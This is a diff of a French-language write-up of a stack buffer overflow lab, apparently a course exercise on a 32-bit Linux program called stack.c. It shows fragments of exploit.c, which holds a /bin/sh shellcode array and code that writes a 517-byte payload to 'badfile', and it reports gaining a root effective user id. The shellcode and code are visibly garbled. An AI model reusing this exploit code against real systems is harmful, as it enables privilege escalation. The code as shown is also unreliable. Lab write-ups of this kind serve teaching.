@@ -4,7 +4,7 @@ Le programe stack.c contient une vulnéarbilité exploitable par injection dans 
 
 Note: Cela à été fait sur une platforme i486 gnu/linux.
 
-# Task I 
+## Task I
 
 -fno-stack-protector va désactiver la stack smashing protection mechanism de gcc, sur le programe stack.
 
@@ -20,8 +20,7 @@ strcopy() étant à l'origine de la plupart des attacks par bof, la tendance des
 
 Le programe exploit.c généré est:
 
-
-char shellcode[]= 
+```char shellcode[]= 
 "310"             /* xorl    
 "50"                 /* pushl   
 "68""//sh"           /* pushl   0x6e69622f            */ 
@@ -32,7 +31,7 @@ char shellcode[]=
 "99"                 /* cdql                           */ 
 "00b"             /* movb    0x80                  */ 
 ; 
- 
+
 void main(int argc, char **argv) 
         
         char buffer[517]; 
@@ -52,7 +51,7 @@ void main(int argc, char **argv)
         /* Save the contents to the file "badfile" */ 
  	badfile = fopen("./badfile", "w"); 
         fwrite(buffer, 517, 1, badfile); 
-        fclose(badfile); 
+        fclose(badfile); ```
 
 L'execution de stack retourne alors ce qu'on voit sur la figure . l'userid effective est bien root.
 
